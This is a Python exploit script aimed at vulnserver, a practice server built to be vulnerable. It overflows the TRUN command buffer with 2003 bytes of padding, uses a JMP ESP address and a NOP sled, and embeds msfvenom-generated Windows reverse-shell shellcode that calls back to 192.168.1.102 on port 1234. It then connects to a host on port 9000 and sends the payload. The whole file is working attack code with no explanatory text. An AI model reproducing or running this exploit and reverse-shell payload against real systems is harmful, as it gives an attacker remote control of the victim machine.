#!/usr/bin/python

#vuln server = https://github.com/stephenradshaw/vulnserver

import sys , socket

buf = "TRUN /.:/"

buf += "A" * 2003

buf += "\xaf\x11\x50\x62"    #JMP ESP

buf += "\x90" * 16      #NOP

#msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.102  lport=1234 -a x86 -f python -b "\x00"
buf +=  b""
buf += b"\xda\xd7\xbf\xf1\x2a\x91\xc6\xd9\x74\x24\xf4\x58\x31"
buf += b"\xc9\xb1\x52\x31\x78\x17\x83\xc0\x04\x03\x89\x39\x73"
buf += b"\x33\x95\xd6\xf1\xbc\x65\x27\x96\x35\x80\x16\x96\x22"
buf += b"\xc1\x09\x26\x20\x87\xa5\xcd\x64\x33\x3d\xa3\xa0\x34"
buf += b"\xf6\x0e\x97\x7b\x07\x22\xeb\x1a\x8b\x39\x38\xfc\xb2"
buf += b"\xf1\x4d\xfd\xf3\xec\xbc\xaf\xac\x7b\x12\x5f\xd8\x36"
buf += b"\xaf\xd4\x92\xd7\xb7\x09\x62\xd9\x96\x9c\xf8\x80\x38"
buf += b"\x1f\x2c\xb9\x70\x07\x31\x84\xcb\xbc\x81\x72\xca\x14"
buf += b"\xd8\x7b\x61\x59\xd4\x89\x7b\x9e\xd3\x71\x0e\xd6\x27"
buf += b"\x0f\x09\x2d\x55\xcb\x9c\xb5\xfd\x98\x07\x11\xff\x4d"
buf += b"\xd1\xd2\xf3\x3a\x95\xbc\x17\xbc\x7a\xb7\x2c\x35\x7d"
buf += b"\x17\xa5\x0d\x5a\xb3\xed\xd6\xc3\xe2\x4b\xb8\xfc\xf4"
buf += b"\x33\x65\x59\x7f\xd9\x72\xd0\x22\xb6\xb7\xd9\xdc\x46"
buf += b"\xd0\x6a\xaf\x74\x7f\xc1\x27\x35\x08\xcf\xb0\x3a\x23"
buf += b"\xb7\x2e\xc5\xcc\xc8\x67\x02\x98\x98\x1f\xa3\xa1\x72"
buf += b"\xdf\x4c\x74\xd4\x8f\xe2\x27\x95\x7f\x43\x98\x7d\x95"
buf += b"\x4c\xc7\x9e\x96\x86\x60\x34\x6d\x41\x4f\x61\x6c\xf7"
buf += b"\x27\x70\x6e\xf3\x65\xfd\x88\x91\x99\xa8\x03\x0e\x03"
buf += b"\xf1\xdf\xaf\xcc\x2f\x9a\xf0\x47\xdc\x5b\xbe\xaf\xa9"
buf += b"\x4f\x57\x40\xe4\x2d\xfe\x5f\xd2\x59\x9c\xf2\xb9\x99"
buf += b"\xeb\xee\x15\xce\xbc\xc1\x6f\x9a\x50\x7b\xc6\xb8\xa8"
buf += b"\x1d\x21\x78\x77\xde\xac\x81\xfa\x5a\x8b\x91\xc2\x63"
buf += b"\x97\xc5\x9a\x35\x41\xb3\x5c\xec\x23\x6d\x37\x43\xea"
buf += b"\xf9\xce\xaf\x2d\x7f\xcf\xe5\xdb\x9f\x7e\x50\x9a\xa0"
buf += b"\x4f\x34\x2a\xd9\xad\xa4\xd5\x30\x76\xd4\x9f\x18\xdf"
buf += b"\x7d\x46\xc9\x5d\xe0\x79\x24\xa1\x1d\xfa\xcc\x5a\xda"
buf += b"\xe2\xa5\x5f\xa6\xa4\x56\x12\xb7\x40\x58\x81\xb8\x40"


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.109',9000))
print("connected")
print s.recv(1024)
print("recv seee")
s.send(buf)
print("buf sent")
s.close()
print("closed")
